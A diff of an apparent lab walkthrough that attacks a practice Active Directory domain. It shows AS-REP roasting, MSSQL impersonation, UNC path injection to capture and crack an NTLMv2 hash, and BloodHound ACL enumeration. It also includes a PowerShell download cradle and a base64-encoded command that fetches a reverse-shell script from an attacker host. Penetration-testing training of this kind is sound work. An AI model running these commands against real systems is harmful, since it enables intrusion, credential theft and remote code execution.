@@ -2,7 +2,7 @@
 
 ## Attack path visualized
 
-![](<../../../../.gitbook/assets/image (68).png>)
+![](<../../../../.gitbook/assets/image (68) (1).png>)
 
 ### 1. Enumerate Users
 
@@ -67,7 +67,7 @@ GetNPUsers.py amsterdam/ -dc-ip 10.0.0.3 -usersfile users.txt -format hashcat -o
 
 2\. The output doesn't show us any successes. But the file `kerberoasting.txt` is there and it has a hash:
 
-![](<../../../../.gitbook/assets/image (67).png>)
+![](<../../../../.gitbook/assets/image (67) (1).png>)
 
 3\. We can crack the hash with Hashcat. I transfered the file to my host since cracking in a VM isn't really ideal, it can't use the GPU then. I always run hashcat with rockyou and the dive ruleset.
 
@@ -88,15 +88,15 @@ git clone https://github.com/fox-it/BloodHound.py
 bloodhound-python -d amsterdam.bank.local -ns 10.0.0.3 -dc DC02.amsterdam.bank.local -u 'Richard' -p 'Sample123' --zip -c all
 ```
 
-![](<../../../../.gitbook/assets/image (2).png>)
+![](<../../../../.gitbook/assets/image (2) (1).png>)
 
 2\. We now can load the data into BloodHound by draggin the zip file into it and see if Richard can do anything usefull:
 
-![](<../../../../.gitbook/assets/image (62).png>)
+![](<../../../../.gitbook/assets/image (62) (1).png>)
 
 Richard is member of the following groups, nothing interesting there:
 
-![](<../../../../.gitbook/assets/image (66).png>)
+![](<../../../../.gitbook/assets/image (66) (1).png>)
 
 The attributes of the user also doesn't show anything interesting:
 
@@ -118,7 +118,7 @@ To check if a user can access any systems I like to use [Crackmapexec](https://g
 crackmapexec smb 10.0.0.0/24 -u richard -p Sample123
 ```
 
-![](<../../../../.gitbook/assets/image (56).png>)
+![](<../../../../.gitbook/assets/image (56) (1).png>)
 
 It can access three hosts over SMB but unfortunately we aren't local admin to any of them. We can still check for any accessible shares by adding the `--shares` parameter.
 
@@ -200,7 +200,7 @@ use master;
 EXECUTE AS LOGIN = 'Developer'
 ```
 
-![](<../../../../.gitbook/assets/image (39).png>)
+![](<../../../../.gitbook/assets/image (39) (1).png>)
 
 Seems like it worked, lets run the query again to check which user we are and if we are sysadmin:
 
@@ -254,7 +254,7 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
-![](<../../../../.gitbook/assets/image (61).png>)
+![](<../../../../.gitbook/assets/image (61) (1).png>)
 
 8\. We are `sa` and have sysadmin privileges. We successfully escalated our privileges from domain user to `sa` with sysadmin privileges on the SQL Server.
 
@@ -311,7 +311,7 @@ $str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:809
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 ```
 
-![](<../../../../.gitbook/assets/image (71) (1).png>)
+![](<../../../../.gitbook/assets/image (71) (1) (1).png>)
 
 * Now we can paste the base64 encoded string in the following querie:
 
@@ -342,7 +342,7 @@ One of the privilege escalation techniques that you don't see so much is doing a
 crackmapexec ldap 10.0.0.3 -u richard -p Sample123 -M MAQ
 ```
 
-![](<../../../../.gitbook/assets/image (71).png>)
+![](<../../../../.gitbook/assets/image (71) (1).png>)
 
 2\. The machine account qouta is 10, meaning we (all authenticated users) can create our own computerobject in the domain. So lets add our own computerobject, this can be done with PowerMad. First we have to download it on our attacking machine, in the same directory as our Webserver is already running:
 
@@ -395,7 +395,7 @@ I also did a nslookup to check if the DNS record was created. The domain control
 python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
 ```
 
-![](<../../../../.gitbook/assets/image (5).png>)
+![](<../../../../.gitbook/assets/image (5) (1).png>)
 
 6\. Next we need to download en load the Change-LockScreen.ps1 script from the nccgroup and load it into memory on the target:
 
@@ -456,7 +456,7 @@ nc -lvp 443
 crackmapexec smb 10.0.0.5 -u administrator -H a59cc2e81b2835c6b402634e584a8edc --local-auth -x 'powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA0ADgALgAyADoAOAAwADkAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQApADsA'
 ```
 
-![](<../../../../.gitbook/assets/image (55).png>)
+![](<../../../../.gitbook/assets/image (55) (1).png>)
 
 And we received a shell as the local administrator. Gotta love PowerShell :)
 
@@ -464,25 +464,139 @@ And we received a shell as the local administrator. Gotta love PowerShell :)
 
 **Task: Enumerate SQL Links to hop across trusts.**
 
+1. We now fully own the server web01 which runs as a SQL Server. During our enumeration we didn't check for any SQL Links. We could do this manually in our connected mssqlclient.py session, but we could also use HeidiSQL from our Windows 10 machine. You might wonder why, but I prefer to use heidisql, especially with bigger queries and data returned. mssqlclient.py for example returns these things like:
 
+![](<../../../../.gitbook/assets/image (70).png>)
+
+To do this we need to setup a port forward since our Windows 10 machine isn't connected to the lab. We can do this with socat. This will make our kali listen on port `1433` and redirect all traffic to `WEB01` (`10.0.0.5`) port `1433`. The SQL Server is running on default on port 1433.
+
+```
+socat tcp-l:1433,fork tcp:10.0.0.5:1433
+```
+
+{% hint style="info" %}
+You can also do this to connect with the native windows Remote Desktop client instead of rdesktop or any linux remote desktop tool. I really prefer doing it that way.
+{% endhint %}
+
+On our Windows 10 machine we need to start [HeidiSQL](https://www.heidisql.com/) with a runas command to authenticate with windows credentials:
+
+```
+runas /netonly /user:amsterdam\richard c:\Tools\AD\HeidiSQL_11.3_64_Portable\heidisql.exe
+```
+
+Then we can connect to the database using the following setup:
+
+![](<../../../../.gitbook/assets/image (68).png>)
+
+{% hint style="info" %}
+For this to work you will need to fill in the IP of your kali machine, which need to be in the same network as the Windows 10 machine.
+{% endhint %}
+
+2\. In HeidiSQL click on the Query tab and execute the following query to enumerate SQL links:
+
+```
+SELECT * FROM master..sysservers;
+```
+
+![](<../../../../.gitbook/assets/image (71).png>)
+
+3\. There is one SQL link to a sql server on `data01.secure.local`. We can try to query the linked server with the following query, using the openquery functionality:
+
+```
+SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'select @@version');
+```
+
+![](<../../../../.gitbook/assets/image (61).png>)
+
+4\. We can also query the server to check if xp\_cmdshell is on so we can execute commands:
+
+```
+SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
+```
+
+![](<../../../../.gitbook/assets/image (56).png>)
+
+Unfortunatelly it isn't enabled. We could try to enable it (and that works too if you configured it). But that is'n't the intended way for the attack path.
 
 ### 8. UNC Path injection
 
 **Task: Perform a UNC Path injection and capture the hash of SQL Service user.**
 
+SQL Servers by default runs as a local service under the context of the computeraccount. But it is possible that the SQL service is running as a domain user which is made for the SQL service. For example `sa_sql`. If we are able to capture its NTLMv2 hash we could try to crack it offline
 
+1. Before we can try to capture hashes we should run [Responder](https://github.com/lgandx/Responder) on our attacking machine. Responder will listen on multiple ports such as SMB, SQL, FTP etc. For executing the attack we only need SMB (port 445). We can run Responder with the following command
+
+```
+sudo responder -I tun0
+```
+
+![](<../../../../.gitbook/assets/image (69).png>)
+
+2\. The next step is to perform a UNC Path injection attack. One SQL function we can use for that is `xp_dirtree`. We can try the UNC Path injection with the following query in HeidiSQL, using the EXEC AT method to execute something through the link:
+
+```
+EXEC('xp_fileexist ''\\192.168.248.2\pwn''') AT "DATA01.SECURE.LOCAL"
+```
+
+![](<../../../../.gitbook/assets/image (5).png>)
+
+3\. If we check our Responder output we can see that we captured the hash from the user `sa_sql` from the domain `Secure`.
+
+![](<../../../../.gitbook/assets/image (38).png>)
 
 ### 9. Crack SQL account hash
 
 **Task: Crack the hash of the SQL service user.**
 
+1. We received a NTLMv2 hash from the `sa_sql` user, which we can try to crack if the password of the user isn't that strong. We can easily do this with Hashcat like we did during the AS-REP roasting. But this time we need another hashmode.
 
+```
+.\hashcat.exe -a 0 -m 5600 .\hash.txt .\wordlists\rockyou.txt  -r .\rules\dive.rule
+```
+
+![](<../../../../.gitbook/assets/image (30).png>)
+
+We successfully cracked the hash of the `sa_sql` user, the password is `Iloveyou2`.
 
 ### 10. ACL - Write Owner & RCBCD
 
 **Task: Check for ACL's and get access to the system.**
 
+1. To enumerate ACL abuses I prefer to run BloodHound. We already gathered the information for `amsterdam.bank.local` but the `sa_sql` user is part of a different domain. To use BloodHound we need to know what the domain controller is for this domain. We can enumerate this in a lot of ways, the easiest way is to try to resolve the domain name:
 
+```
+nslookup secure.local
+```
+
+![](<../../../../.gitbook/assets/image (65).png>)
+
+2\. The IP for secure.local is `10.0.0.100`, we can quickly run Crackmapexec and see if we can connect to it over SMB:
+
+```
+crackmapexec smb 10.0.0.100
+```
+
+![](<../../../../.gitbook/assets/image (64).png>)
+
+3\. The hostname is `DC03`, and the machine is part of `secure.local`. We probably found the domain controller. Lets run BloodHound with the gathered credentials to retrieve the domain data:
+
+```
+bloodhound-python -d secure.local -ns 10.0.0.100 -dc DC03.secure.local -u 'sa_sql' -p 'Iloveyou2' --zip -c all
+```
+
+![](<../../../../.gitbook/assets/image (26).png>)
+
+We were able to successfully gather the BloodHound data. We can load it by dragging it into BloodHound like we did earlier. We can also find the `sa_sql` user now:
+
+![](<../../../../.gitbook/assets/image (13).png>)
+
+4\. Click on the user and scroll down in the "Node Info" till the "Outbound Control Rights" section. If there is any data here, it means the object has control on another object. Lets click on the number "1".
+
+![](<../../../../.gitbook/assets/image (66).png>)
+
+We see that the user has WriteOwner permissions:
+
+![](<../../../../.gitbook/assets/image (67).png>)
 
 ### 11. Dumping DPAPI
 
